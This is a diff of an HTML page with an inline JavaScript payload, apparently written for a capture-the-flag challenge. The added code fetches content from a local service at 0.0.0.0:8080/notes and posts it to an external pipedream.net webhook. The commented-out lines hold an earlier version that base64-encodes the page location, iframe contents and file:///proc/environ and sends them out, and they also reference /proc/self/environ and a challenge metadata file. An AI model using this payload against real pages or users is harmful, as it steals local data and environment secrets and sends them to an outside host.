@@ -1,25 +1,39 @@
 <html>
   <body>
     <script>
+      var req = new XMLHttpRequest();
+      req.open('GET', 'http://0.0.0.0:8080/notes', true);
+      req.setRequestHeader('Access-Control-Allow-Origin', '*');
+      req.setRequestHeader('Origin', '0.0.0.0:8080');
+      req.send(null);
+      if(req.status == 200) {
+        src = req.responseText;
+      }
+      else {
+        src = req.statusText;
+      }
+      var req_webhook = new XMLHttpRequest();
+      req_webhook.open('POST', `https://en54ypp3nacrf.x.pipedream.net/`, true);
+      req_webhook.send(src);
        //var link = document.createElement("button");
        //link.name = "action";
        //link.onclick = "history.go(-2)";
        //document.body.appendChild(link);
-       var iframe = document.createElement('iframe');
+//        var iframe = document.createElement('iframe');
        //var loadNewScript = '<script>function newDoc() {location.assign("https://www.w3schools.com")}<'+"/script>";
-       document.body.appendChild(iframe);
-       iframe.id = 'i1'
-       iframe.src = 'http://0.0.0.0:8080/notes';
-       iframe.width = '1000';
-       iframe.height = '400';
+//        document.body.appendChild(iframe);
+//        iframe.id = 'i1'
+//        iframe.src = 'http://0.0.0.0:8080/notes';
+//        iframe.width = '1000';
+//        iframe.height = '400';
        //iframe.contentLocation.assign('notes')
        //iframe.body.appendChild(loadNewScript);
-      async function lmao() {
-      fetch("https://enzv2dem6iht.x.pipedream.net/?location=" + btoa(JSON.stringify(location)));
-      fetch("https://enzv2dem6iht.x.pipedream.net/?iframe=" + btoa(JSON.stringify(document.getElementById("i1").contentWindow.document.documentElement.outerHTML)));
-      fetch("https://enzv2dem6iht.x.pipedream.net/?src=" + btoa(await fetch("file:///proc/environ").then(res => res.text()).catch(err => { console.log(err.toString()); return err.toString(); })));
-      }
-      lmao()
+//       async function lmao() {
+//       fetch("https://enzv2dem6iht.x.pipedream.net/?location=" + btoa(JSON.stringify(location)));
+//       fetch("https://enzv2dem6iht.x.pipedream.net/?iframe=" + btoa(JSON.stringify(document.getElementById("i1").contentWindow.document.documentElement.outerHTML)));
+//       fetch("https://enzv2dem6iht.x.pipedream.net/?src=" + btoa(await fetch("file:///proc/environ").then(res => res.text()).catch(err => { console.log(err.toString()); return err.toString(); })));
+//       }
+//       lmao()
 //       link.click();
 //       var response = fetch('file:///challenge/metadata.json')
 //       var envr = fetch('file:///proc/self/environ')
